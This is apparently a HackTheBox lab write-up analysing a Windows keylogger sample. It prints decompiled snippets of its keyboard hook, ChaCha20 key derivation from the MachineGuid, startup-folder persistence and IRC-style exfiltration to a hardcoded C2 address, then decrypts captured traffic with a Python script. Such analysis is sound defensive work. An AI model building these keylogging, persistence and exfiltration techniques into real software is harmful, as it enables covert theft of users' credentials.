---
title: "HTB-SneakyKeys"
date: 2026-02-03
draft: false
tags:
  - Malware Analysis
  - Network Analysis
  - Reverse Engineering
  - Windows
  - PE
  - ChaCha20
  - Wireshark
  - IDA
platform: Malware Analysis
---



{{< infobox platform="HackTheBox" difficulty="Medium" os="Windows" date="2026-02-03" >}}
Description:  


### <span style="color:lightblue">TL;DR</span>
This malware is a targeted keylogger written in C++ (MinGW) that monitors specific applications (e.g., Google Chrome). It generates a unique session key from the victim's MachineGuid, removes dashes to form a 32-byte key, and uses ChaCha20 to encrypt keystrokes. The encrypted data is exfiltrated over a raw TCP connection to a C2 server using an IRC-like protocol, posting into the `#key_storrage` channel. The malware ensures persistence by copying itself to the `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` folder and employs anti-debugging techniques by decrypting critical strings only when no debugger is detected.

### <span style="color:red">initial analysis</span>
```console
$ file *             
cap.pcapng:     pcapng capture file - version 1.0
SneakyKeys.exe: PE32+ executable for MS Windows 5.02 (console), x86-64 (stripped to external PDB), 11 sections
```
#### imports
This malware sample imports a variety of Windows API functions that reveal its capabilities and potential behaviors:

**Process and Thread Manipulation**   
`OpenProcess` - potential process injection  
`VirtualProtect` - shellcode injection or code unpacking  
`VirtualQuery` - potential process injection   

**Network (WS2_32.dll)**
full networking stack for C2 communication  
![alt text](image.png)

**Keylogging**
![alt text](image1.png)

#### strings
```
172.25.21.54 - hardcoded IP address
My_dUp3r_sup3r_kon3_n0nc - hardcoded encryption key
chacha20.h - ChaCha20 stream cipher implementation
#key_storrage - IRC channel used for keystroke exfiltration
```


### <span style="color:red">reversing</span>

I decompiled the main function and renamed subroutines based on their functionality:
```c
__int64 mw_main()
{
  mw_key_hook();                                       // sets up the keyboard hook
  mw_registry(mw_ptr_to_uuid);                         // retrieves MachineGuid
  sub_1400B1FC0(qword_14010A260, mw_ptr_to_uuid);      // stores UUID globally
  mw_jfree(mw_ptr_to_uuid);
  
  // decrypts username using static key
  mw_antidebug_decrypt(mw_username, 8, &unk_1400D4020); 
  v0 = sub_1400307D0(mw_username);
  
  mw_copy_to_startup_folder();                         // persistence
  mw_start_irc(v5, qword_14010A260);                   // connects to C2
}
```


**mw_key_hook()** The hook installation confirms the keylogging behavior:
```c
  hhk = SetWindowsHookExA(13, fn, 0, 0);   // 13 = WH_KEYBOARD_LL
```

The callback function `fn()` contains the core logic:  
\- checks if the active window title contains "Google Chrome"  
\- If a standard key is pressed, it's added to a buffer  
\- If ENTER is pressed, the buffer is encrypted and sent  

```c
LRESULT __fastcall fn(int code, WPARAM wParam, KBDLLHOOKSTRUCT *lParam)
{
  if ( !code && (wParam == 256 || wParam == 260) ) // WM_KEYDOWN
  {
      mw_window_title(v16);                  // captures the active window title for context
      mw_antidebug_decrypt(v21, 13, &unk_1400D4040);  // decrypts Google Chrome
//...[snip]...
      sub_1400CF8B0(v33, v34, " ");
      sub_1400CF8B0(v32, v33, "#key_storrage");   // tags the message with the IRC channel
      sub_1400CF8B0(v31, v32, " :");
//...[snip]...
      mw_send(s, v30);
  }
  else 
  {
    sub_1400B2390(&unk_14010A280, vkCode); // buffer
  }
```

### <span style="color:red">cryptography</span>
The malware uses `ChaCha20` for two purposes with different keys:  
#### config decryption
1. Uses a hardcoded static key found in `.data` to decrypt strings like "Google Chrome" and C2 commands.  
```
Key: 4D795F64557033725F73757033725F6B6F6E335F6E306E63291A000000000000
Nonce: 6F6E335F6E306E63 (on3_n0nc)
```
#### keystrokes decryption
2. Uses a dynamic key (UUID) derived from the victim's machine.
The `mw_registry()` func retrieves **MachineGuid** from `HKLM\SOFTWARE\Microsoft\Cryptography` and stored it in `qword_14010A260`
```c
//...[snip]...
  v27 = 45;
  v26 = sub_1400CDAF0(v5, v4, &v27);              
  mw_start_uuid = sub_1400AEE90(qword_14010A260);  // qword_14010A260 - UUID
  mw_end_uuid   = sub_1400AF4B0(qword_14010A260); 
  sub_1400AD050(v20, mw_end_uuid, mw_start_uuid, &v28);
  v10 = sub_1400AD020(v20);
  mw_chacha20(v18, v10, &unk_1400D4010, 0);       // encrypts keystroke with uuid key
//...[snip]...
```

### <span style="color:red">persistance</span>
mw_copy_to_startup_folder() — achieves persistence by copying the malware executable into the `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` folder.

```c
  if ( SHGetFolderPathA(0, 7, 0, 0, pszPath) )   // 7 = CSIDL_STARTUP
    return -1;
  mw_antidebug_crypt(v7, 8, &unk_1400D4028);     // decrypts gg.exe
//...[snip]...
  if ( GetModuleFileNameA(0, Filename, 0x104u) ) 
  {
    if ( CopyFileA(Filename, v2, 0) )             // copies self → Startup\gg.exe
```

### <span style="color:red">communication with c2</span>
**mw_start_irc()** — connects to the C2 server over a raw TCP socket and communicates using a lightweight IRC-like protocol. The client registers itself using the victim's `MachineGuid` as the nickname, then enters a loop that receives commands and sends encrypted keystroke data into the `#key_storrage` channel.

### <span style="color:red">decryption</span>
Analysing the PCAP capture we identified Alice's IRC session. Her client registered with the following nickname and user string, which exposes her full `MachineGuid`:
```
NICK ALICE_9d9a51bf
USER ALICE_9d9a51bf 0 * :Client with id:9d9a51bf-b38f-4964-99ad-31c1249d5a70
```

The `MachineGuid` is `9d9a51bf-b38f-4964-99ad-31c1249d5a70`. Stripping dashes gives the 32-byte ChaCha20 key: `9d9a51bfb38f496499ad31c1249d5a70`. The nonce is the hardcoded `on3_n0nc`.
Several encrypted keystroke messages were captured in the `#key_storrage` channel:

```
PRIVMSG #key_storrage :0b8fda0526231ab7
PRIVMSG #key_storrage :0e8bca69d22f1db404802cc6eb5234fbd7598f71914d74a386e6ddd55b3eb005c78c4d4a75fa6b519b196ea9d85438001d244e06b8401b
PRIVMSG #key_storrage :0b97b31ed73211aa768c5fd4862226edca4a896d924d64bff387c5d45128a113c5
PRIVMSG #key_storrage :1681c01dcb2307b3749d2ccce337379ed049e67d93397aa99688a9c841
```

The following Python script decrypts the messages using PyCryptodome:

```python
from Crypto.Cipher import ChaCha20
key   = "9d9a51bfb38f496499ad31c1249d5a70".encode('utf-8')
nonce = b"on3_n0nc"
cipher = ChaCha20.new(key=key, nonce=nonce)

ciphertext = bytes.fromhex("0b97b31ed73211aa768c5fd4862226edca4a896d924d64bff387c5d45128a113c5")
print(cipher.decrypt(ciphertext))
```

```console
$ python3 dec.py
b'MY WORDPRESS PASSWORD IS ALICE1SO'
```